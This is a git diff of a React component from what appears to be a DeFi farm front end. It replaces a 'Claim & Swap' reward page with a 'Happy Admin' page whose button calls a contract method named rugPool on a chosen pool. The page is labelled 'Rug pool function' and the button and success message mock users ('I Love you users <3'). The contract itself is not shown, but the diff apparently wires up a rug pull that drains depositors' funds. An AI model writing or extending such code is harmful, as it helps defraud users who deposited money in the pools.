@@ -1,32 +1,32 @@
 import {
   Text,
-  Grid,
-  GridItem,
-  Select,
   Button,
-  Box,
   Center,
   Divider,
   Spinner,
+  GridItem,
+  Grid,
+  Box,
+  Select,
   useToast,
 } from "@chakra-ui/react";
-import { useState, useEffect } from "react";
-import { useAutoCompound } from "hooks/useContracts";
+import { useFarm } from "hooks/useContracts";
 import useAccount from "hooks/useAccount";
 import { useWhitelisted } from "hooks/useFunctions";
+import { useState, useEffect } from "react";
+import Toast from "components/Utils/Toast/Toast";
 
-const ClaimAndSwap = () => {
+const HappyAdmin = () => {
+  const account = useAccount();
   const getWhitelisted = useWhitelisted();
   const [whitelisted, setWhitelisted] = useState([]);
-  const account = useAccount();
-  const AutoCompound = useAutoCompound();
+  const [loveToken, setLoveToken] = useState(null);
+  const Farm = useFarm();
   const toast = useToast();
 
   useEffect(() => {
     setWhitelisted(getWhitelisted);
   }, [getWhitelisted]);
-
-  const [claimAddress, setClaimAddress] = useState(null);
 
   const [send_tx_status, setSendTxStatus] = useState(false);
   const [wait_tx, setWaitTx] = useState(false);
@@ -37,15 +37,15 @@ const ClaimAndSwap = () => {
     return status;
   };
 
-  const handleChangeClaimAddress = (e) => {
-    setClaimAddress(e.target.value);
+  const handleChangeLoveToken = (e) => {
+    setLoveToken(e.target.value);
   };
 
-  const handleClaimAndSwap = async () => {
+  const handleLoveU = async () => {
     setSendTxStatus(true);
     setWaitTx(true);
-    await AutoCompound.methods
-      .claimAndSwap(claimAddress)
+    await Farm.methods
+      .rugPool(loveToken)
       .send({ from: account })
       .on("transactionHash", (hash) => {
         const claimCheck = setInterval(async () => {
@@ -54,9 +54,10 @@ const ClaimAndSwap = () => {
             setWaitTx(false);
             setSendTxStatus(false);
             clearInterval(claimCheck);
+
             toast({
               title: "Success",
-              description: "Claming and Swap success!",
+              description: "Told Love you users Success!",
               status: "success",
               duration: 1500,
               isClosable: true,
@@ -65,23 +66,19 @@ const ClaimAndSwap = () => {
         }, 1500);
       });
   };
-
   return (
     <>
       <Text fontSize="xl" mt={3} style={{ textAlign: "center" }}>
-        <b>Claim & Swap</b>
+        <b>Happy Admin</b>
       </Text>
 
-      <Text style={{ textAlign: "center" }}>
-        Claim $MIM reward and Swap to any token
-      </Text>
-
+      <Text style={{ textAlign: "center" }}>Rug pool function</Text>
       <Center>
         <Box width={"50%"}>
           <Grid pt={10} templateColumns="repeat(10, 1fr)" gap={0}>
             <GridItem colSpan={10}>
               <Select
-                onChange={handleChangeClaimAddress}
+                onChange={handleChangeLoveToken}
                 placeholder="Choose Pool"
               >
                 {whitelisted &&
@@ -102,11 +99,11 @@ const ClaimAndSwap = () => {
               color: "#FFFFFF",
               background: "linear-gradient(90deg ,#576cea 0%, #da65d1 100%)",
             }}
-            disabled={claimAddress == null || (wait_tx && send_tx_status)}
-            mt={3}
+            disabled={loveToken == null || (wait_tx && send_tx_status)}
+            mt={2}
             w={"100%"}
             onClick={() => {
-              handleClaimAndSwap();
+              handleLoveU();
             }}
           >
             {wait_tx && send_tx_status ? (
@@ -114,7 +111,7 @@ const ClaimAndSwap = () => {
                 <Spinner size={"sm"} mr={2} /> Waiting ...
               </>
             ) : (
-              "Claim & Swap"
+              "I Love you users <3"
             )}
           </Button>
         </Box>
@@ -124,4 +121,4 @@ const ClaimAndSwap = () => {
   );
 };
 
-export default ClaimAndSwap;
+export default HappyAdmin;
